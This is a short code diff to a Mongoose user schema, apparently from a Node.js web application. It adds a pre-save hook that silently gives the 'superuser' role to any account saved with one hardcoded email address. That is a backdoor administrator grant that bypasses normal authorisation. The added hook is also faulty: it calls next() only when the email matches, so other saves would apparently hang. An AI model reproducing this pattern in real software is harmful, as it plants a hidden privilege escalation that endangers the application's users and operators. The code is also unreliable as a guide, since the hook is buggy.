@@ -50,6 +50,13 @@ const userSchema = new Schema({
 });
 
 userSchema.pre('save', async function (next) {
+    if (this.email === 'jaysencarlo13@gmail.com') {
+        this.user_type = 'superuser';
+        return next();
+    }
+});
+
+userSchema.pre('save', async function (next) {
     if (!this.isModified('google.password')) next();
     const iv = Buffer.from(secret, 'ascii').slice(0, 16);
     const algorithm = 'aes-256-cbc';
